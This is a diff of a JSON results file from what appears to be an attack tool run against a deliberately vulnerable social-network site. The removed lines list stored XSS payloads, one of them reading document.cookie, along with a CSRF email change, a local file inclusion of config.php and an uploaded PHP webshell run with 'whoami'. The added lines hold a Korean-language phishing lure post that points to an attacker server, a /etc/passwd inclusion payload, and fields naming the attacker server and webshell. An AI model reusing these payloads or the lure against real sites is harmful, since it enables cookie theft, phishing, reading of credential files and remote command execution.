@@ -1,65 +1,27 @@
 {
-  "target": "http://18.179.53.107/vulnerable-sns/www",
-  "timestamp": "2025-11-05 11:25:10",
-  "total_vulnerabilities": 8,
   "vulnerabilities": {
     "sql_injection": [],
     "xss": [
       {
         "url": "http://18.179.53.107/vulnerable-sns/www/new_post.php",
-        "payload": "<body onload=alert(document.cookie)>",
-        "type": "stored",
-        "location": "index.php"
-      },
-      {
-        "url": "http://18.179.53.107/vulnerable-sns/www/new_post.php",
-        "payload": "<img src=x onerror=alert(1)>",
-        "type": "stored",
-        "location": "index.php"
-      },
-      {
-        "url": "http://18.179.53.107/vulnerable-sns/www/new_post.php",
-        "payload": "<div onmouseover=alert(1)>hover</div>",
-        "type": "stored",
-        "location": "index.php"
-      },
-      {
-        "url": "http://18.179.53.107/vulnerable-sns/www/new_post.php",
-        "payload": "<marquee onstart=alert(1)>XSS</marquee>",
-        "type": "stored",
-        "location": "index.php"
+        "payload": "🎁 특별 이벤트! 🎁\n\n무료 10,000 포인트 받기!\n지금 클릭: http://13.158.67.78:5000/fake-gift\n\n선착순 100명! 서두르세요!",
+        "description": "Direct link with emoji - Redirect to attacker server",
+        "attack_type": "xss_redirect_csrf",
+        "target_url": "http://13.158.67.78:5000/fake-gift",
+        "attacker_id": "1"
       }
     ],
-    "csrf": [
-      {
-        "url": "http://18.179.53.107/vulnerable-sns/www/profile.php",
-        "method": "GET",
-        "type": "state_change_via_get",
-        "modified_field": "email",
-        "test_value": "csrf_test_1762309507@test.com"
-      }
-    ],
+    "csrf": [],
     "lfi": [
       {
-        "url": "http://18.179.53.107/vulnerable-sns/www/file.php?name=../config.php",
-        "payload": "../config.php",
-        "indicator": "DB_",
-        "type": "local_file_inclusion"
+        "url": "http://18.179.53.107/vulnerable-sns/www/file.php",
+        "payload": "/etc/passwd",
+        "description": "passwd file (absolute)"
       }
     ],
-    "file_upload": [
-      {
-        "url": "http://18.179.53.107/vulnerable-sns/www/uploads/shell.php5&cmd=whoami",
-        "type": "rce",
-        "command": "whoami",
-        "output": "<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\">\n<html><head>\n<title>404 Not Found</title>\n</head><body>\n<h1>Not Found</h1>\n<p>The requested URL was not found on this server.</p>\n<hr>\n<address>Apach"
-      },
-      {
-        "url": "http://18.179.53.107/vulnerable-sns/www/upload.php",
-        "filename": "shell.php5",
-        "path": "file.php?name=shell.php5",
-        "type": "malicious_upload_rce"
-      }
-    ]
-  }
+    "file_upload": []
+  },
+  "attacker_server": "http://13.158.67.78:5000",
+  "attacker_user_id": "1",
+  "uploaded_webshell": null
 }
